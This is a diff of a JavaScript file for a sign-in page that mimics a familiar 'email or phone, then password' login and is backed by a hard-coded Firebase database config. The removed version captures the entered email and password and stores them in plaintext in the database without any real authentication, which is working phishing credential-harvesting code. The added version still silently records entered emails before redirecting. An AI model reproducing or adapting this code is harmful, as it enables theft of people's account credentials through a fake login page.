@@ -1,69 +1,58 @@
-// Import Firebase modules
-import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+// Import Firebase modules (using modular Firebase)
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js";
 
 // Firebase configuration
 const firebaseConfig = {
-    apiKey: "AIzaSyDZAnKjWmv3cWhwOXpL7UjRgOpwK6mQVi0",
-    authDomain: "django-eb349.firebaseapp.com",
-    databaseURL: "https://django-eb349-default-rtdb.asia-southeast1.firebasedatabase.app",
-    projectId: "django-eb349",
-    storageBucket: "django-eb349.appspot.com",
-    messagingSenderId: "271670409370",
-    appId: "1:271670409370:web:51498b4b417669173f8723",
+  apiKey: "AIzaSyDZAnKjWmv3cWhwOXpL7UjRgOpwK6mQVi0",
+  authDomain: "django-eb349.firebaseapp.com",
+  databaseURL: "https://django-eb349-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "django-eb349",
+  storageBucket: "django-eb349.appspot.com",
+  messagingSenderId: "271670409370",
+  appId: "1:271670409370:web:51498b4b417669173f8723"
 };
 
 // Initialize Firebase
 const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
 
-// DOM elements
-const emailInput = document.getElementById("email");
-const emailGroup = document.getElementById("emailGroup");
-const passwordInput = document.getElementById("password");
-const passwordGroup = document.getElementById("passwordGroup");
-const nextButton = document.getElementById("nextButton");
+// Handle the "Next" button click
+document.getElementById('nextBtn').addEventListener('click', function () {
+  const emailField = document.getElementById('email');
+  const email = emailField.value.trim();
 
-// Step 1: Email input
-nextButton.addEventListener("click", function () {
-    if (emailGroup.style.display !== "none") {
-        // Validate email
-        if (emailInput.value.trim() === "") {
-            alert("Please enter your email or phone.");
-            return;
-        }
-        // Hide email input and show password input
-        emailGroup.style.display = "none";
-        passwordGroup.style.display = "block";
-        nextButton.textContent = "Sign in";
-    } else {
-        // Step 2: Password input
-        if (passwordInput.value.trim() === "") {
-            alert("Please enter your password.");
-            return;
-        }
-        // Save data to Firebase
-        saveToFirebase(emailInput.value.trim(), passwordInput.value.trim());
-    }
+  if (email === '') {
+    alert('Please enter an email or phone number.');
+    emailField.focus();
+    return;
+  }
+
+  // Save user data to Firebase
+  saveUserData(email)
+    .then(() => {
+      console.log('Data saved successfully in Firebase!');
+      // Redirect to the main index page
+      window.location.href = 'index.html';
+    })
+    .catch(error => {
+      console.error('Error saving data to Firebase:', error);
+      alert('Failed to save data. Please try again.');
+    });
 });
 
-// Function to save data to Firebase
-function saveToFirebase(email, password) {
-    const timestamp = new Date().toISOString();
-    set(ref(database, "users/" + timestamp), {
-        email: email,
-        password: password,
-    })
-        .then(() => {
-            alert("Data saved successfully!");
-            // Reset form and go back to email input
-            emailGroup.style.display = "block";
-            passwordGroup.style.display = "none";
-            nextButton.textContent = "Next";
-            emailInput.value = "";
-            passwordInput.value = "";
-        })
-        .catch((error) => {
-            alert("Error saving data: " + error.message);
-        });
+// Function to save user data to Firebase
+function saveUserData(email) {
+  const userId = generateUserId(); // Generate a unique ID for the user
+  const userRef = ref(database, 'users/' + userId);
+
+  return set(userRef, {
+    email: email,
+    timestamp: new Date().toISOString()
+  });
+}
+
+// Helper function to generate a unique user ID
+function generateUserId() {
+  return 'user_' + Math.random().toString(36).substr(2, 9);
 }
